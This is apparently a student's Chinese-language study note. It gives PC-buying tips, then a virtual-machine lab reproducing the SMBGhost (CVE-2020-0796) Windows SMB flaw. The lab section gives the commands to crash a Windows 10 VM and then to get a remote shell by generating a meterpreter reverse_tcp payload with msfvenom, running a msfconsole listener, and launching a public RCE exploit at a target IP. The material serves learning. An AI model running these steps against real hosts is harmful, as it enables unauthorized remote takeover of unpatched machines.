7.9

上午学习了笔记本与台式电脑的选配，利用虚拟机来操作【**永恒之黑漏洞(CVE-2020-0796)**】，以及使用EXP对同局域网下电脑的控制。

一.电脑的选配

1.笔记本打性价比低于组装的台式机

2.笔记本电脑的要求，cpu，显卡，内存，硬盘，着重点

1.cpu选择多核多线程的，个人学习英特尔cpu优先。
2.显卡，优先选择英伟达。
3.内存，内存要符合主板和cpu，一般16（8*8）G够用，可以购买32G
4.硬盘，笔记本硬盘位少，尽量选择硬盘位多的笔记本，或者其他扩展性强的。
5.一线品牌溢价，三线无售后。
6.购买和选配前可查看显卡天梯图和cpu天梯图，或者去百度查找测评视频。
7.同价位对比接口，屏幕等，货比三家再选购

二.永恒之黑漏洞(CVE-2020-0796)

1.POC与EXP

POC作为验证漏洞，多用于验证漏洞的可行性与危险性
EXP一般作为攻击手段，复现难度大。

2.POC

1.复制链接进入下载文件


2.启动模拟器，运行win10和kali虚拟机。将下好的压缩包解压，保存到桌面，然后将解压后的文件夹托到kali系统中。

3.打开放入的文件夹，在打开的文件夹中右键，选择“在这里选择终端”。

4.在win终端输入【ipconfig】，获取虚拟机ip
5.在kali终端里输入【pip install ntlm_auth
./CVE-2020-0796.py 攻击目标ip地址】

6.攻击实现，win10虚拟机蓝屏。注意！！win10虚拟机要关闭防火墙服务和安全服务

3.EXP

1.与POC类似的，需要下载其他人的源代码网址如下：
https://github.com/chompie1337/SMBGhost_RCE_PoC
2.下载并安装好后拖入kali虚拟机
3.同样点开下载好的文件夹，右键，启用终端。
4.在终端输入【ifconfig】可获得kali虚拟机的ip

5.然后分别在终端输入
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=kaliip LPORT=5556 -b ‘\x00’ -i 5 -f python > exploit

使用vim
vim exploit 回车
:%s/buf/USER_PAYLOAD 回车
:wq! 回车
6.将exploit内容替换到exploit.py
7.再次打开终端，输入
msfconsole

use exploit/multi/handler

set payload windows/x64/meterpreter/reverse_tcp

show options

set lhost kali的ip

set lport 5556

run
8.最后输入 python exploit.py -ip 目标ip
